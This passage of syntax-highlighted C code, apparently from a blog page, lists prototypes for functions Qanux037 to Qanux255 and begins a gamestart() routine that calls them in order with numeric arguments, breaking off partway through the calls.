class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux037</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux038</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux039</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux040</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux041</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux042</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux043</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux044</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux045</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux046</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux047</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux048</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux049</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux050</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux051</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux052</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux053</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux054</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux055</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux056</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux057</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux058</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux059</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux060</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux061</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux062</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux063</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux064</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux065</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux066</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux067</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux068</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux069</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux070</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux071</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux072</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux073</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux074</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux075</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux076</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux077</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux078</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux079</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux080</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux081</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux082</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux083</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux084</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux085</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux086</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux087</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux088</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux089</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux090</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux091</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux092</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux093</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux094</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux095</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux096</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux097</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux098</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux099</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux100</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux101</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux102</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux103</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux104</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux105</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux106</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux107</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux108</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux109</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux110</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux111</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux112</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux113</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux114</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux115</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux116</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux117</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux118</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux119</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux120</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux121</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux122</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux123</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux124</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux125</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux126</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux127</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux128</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux129</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux130</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux131</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux132</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux133</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux134</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux135</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux136</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux137</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux138</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux139</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux140</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux141</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux142</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux143</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux144</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux145</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux146</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux147</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux148</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux149</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux150</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux151</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux152</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux153</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux154</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux155</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux156</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux157</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux158</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux159</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux160</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux161</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux162</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux163</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux164</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux165</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux166</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux167</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux168</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux169</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux170</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux171</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux172</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux173</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux174</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux175</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux176</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux177</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux178</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux179</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux180</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux181</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux182</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux183</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux184</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux185</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux186</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux187</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux188</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux189</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux190</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux191</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux192</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux193</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux194</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux195</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux196</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux197</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux198</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux199</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux200</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux201</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux202</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux203</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux204</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux205</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux206</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux207</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux208</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux209</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux210</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux211</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux212</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux213</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux214</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux215</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux216</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux217</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux218</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux219</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux220</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux221</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux222</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux223</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux224</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux225</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux226</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux227</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux228</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux229</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux230</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux231</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux232</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux233</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux234</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux235</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux236</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux237</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux238</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux239</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux240</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux241</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux242</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux243</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux244</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux245</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux246</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux247</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux248</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux249</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux250</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux251</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux252</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux253</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux254</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux255</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gamestart</span><span class="params">()</span> &#123;</span><br><span class="line">    tiandongwanxiang();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    guobapenhuo();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    Qanux000(<span class="number">0</span>);</span><br><span class="line">    Qanux001(<span class="number">1</span>);</span><br><span class="line">    Qanux002(<span class="number">2</span>);</span><br><span class="line">    Qanux003(<span class="number">3</span>);</span><br><span class="line">    Qanux004(<span class="number">4</span>);</span><br><span class="line">    Qanux005(<span class="number">5</span>);</span><br><span class="line">    Qanux006(<span class="number">6</span>);</span><br><span class="line">    Qanux007(<span class="number">7</span>);</span><br><span class="line">    Qanux008(<span class="number">8</span>);</span><br><span class="line">    Qanux009(<span class="number">9</span>);</span><br><span class="line">    Qanux010(<span class="number">10</span>);</span><br><span class="line">    Qanux011(<span class="number">11</span>);</span><br><span class="line">    Qanux012(<span class="number">12</span>);</span><br><span class="line">    Qanux013(<span class="number">13</span>);</span><br><span class="line">    Qanux014(<span class="number">14</span>);</span><br><span class="line">    Qanux015(<span class="number">15</span>);</span><br><span class="line">    Qanux016(<span class="number">16</span>);</span><br><span class="line">    Qanux017(<span class="number">17</span>);</span><br><span class="line">    Qanux018(<span class="number">18</span>);</span><br><span class="line">    Qanux019(<span class="number">19</span>);</span><br><span class="line">    Qanux020(<span class="number">20</span>);</span><br><span class="line">    Qanux021(<span class="number">21</span>);</span><br><span class="line">    Qanux022(<span class="number">22</span>);</span><br><span class="line">    Qanux023(<span class="number">23</span>);</span><br><span class="line">    Qanux024(<span class="number">24</span>);</span><br><span class="line">    Qanux025(<span class="number">25</span>);</span><br><span class="line">    Qanux026(<span class="number">26</span>);</span><br><span class="line">    Qanux027(<span class="number">27</span>);</span><br><span class="line">    Qanux028(<span class="number">28</span>);</span><br><span class="line">    Qanux029(<span class="number">29</span>);</span><br><span class="line">    Qanux030(<span class="number">30</span>);</span><br><span class="line">    Qanux031(<span class="number">31</span>);</span><br><span class="line">    Qanux032(<span class="number">32</span>);</span><br><span class="line">    Qanux033(<span class="number">33</span>);</span><br><span class="line">    Qanux034(<span class="number">34</span>);</span><br><span class="line">    Qanux035(<span class="number">35</span>);</span><br><span class="line">    Qanux036(<span class="number">36</span>);</span><br><span class="line">    Qanux037(<span class="number">37</span>);</span><br><span class="line">    Qanux038(<span class="number">38</span>);</span><br><span class="line">    Qanux039(<span class="number">39</span>);</span><br><span class="line">    Qanux040(<span class="number">40</span>);</span><br><span class="line">    Qanux041(<span class="number">41</span>);</span><br><span class="line">    Qanux042(<span class="number">42</span>);</span><br><span class="line">    Qanux043(<span class="number">43</span>);</span><br><span class="line">    Qanux044(<span class="number">44</span>);</span><br><span class="line">    Qanux045(<span class="number">45</span>);</span><br><span class="line">    Qanux046(<span class="number">46</span>);</span><br><span class="line">    Qanux047(<span class="number">47</span>);</span><br><span class="line">    Qanux048(<span class="number">48</span>);</span><br><span class="line">    Qanux049(<span class="number">49</span>);</span><br><span class="line">    Qanux050(<span class="number">50</span>);</span><br><span class="line">    Qanux051(<span class="number">51</span>);</span><br><span class="line">    Qanux052(<span class="number">52</span>);</span><br><span class="line">    Qanux053(<span class="number">53</span>);</span><br><span class="line">    Qanux054(<span class="number">54</span>);</span><br><span class="line">    Qanux055(<span class="number">55</span>);</span><br><span class="line">    Qanux056(<span class="number">56</span>);</span><br><span class="line">    Qanux057(<span class="number">57</span>);</span><br><span class="line">    Qanux058(<span class="number">58</span>);</span><br><span class="line">    Qanux059(<span class="number">59</span>);</span><br><span class="line">    Qanux060(<span class="number">60</span>);</span><br><span class="line">    Qanux061(<span class="number">61</span>);</span><br><span class="line">    Qanux062(<span class="number">62</span>);</span><br><span class="line">    Qanux063(<span class="number">63</span>);</span><br><span class="line">    Qanux064(<span class="number">64</span>);</span><br><span class="line">    Qanux065(<span class="number">65</span>);</span><br><span class="line">    Qanux066(<span class="number">66</span>);</span><br><span class="line">    Qanux067(<span class="number">67</span>);</span><br><span class="line">    Qanux068(<span class="number">68</span>);</span><br><span class="line">    Qanux069(<span class="number">69</span>);</span><br><span class="line">    Qanux070(<span class="number">70</span>);</span><br><span class="line">    Qanux071(<span class="number">71</span>);</span><br><span class="line">    Qanux072(<span class="number">72</span>);</span><br><span class="line">    Qanux073(<span class="number">73</span>);</span><br><span class="line">    Qanux074(<span class="number">74</span>);</span><br><span class="line">    Qanux075(<span class="number">75</span>);</span><br><span class="line">    Qanux076(<span class="number">76</span>);</span><br><span class="line">    Qanux077(<span class="number">77</span>);</span><br><span class="line">    Qanux078(<span class="number">78</span>);</span><br><span class="line">    Qanux079(<span class="number">79</span>);</span><br><span class="line">    Qanux080(<span class="number">80</span>);</span><br><span class="line">    Qanux081(<span class="number">81</span>);</span><br><span class="line">    Qanux082(<span class="number">82</span>);</span><br><span class="line">    Qanux083(<span 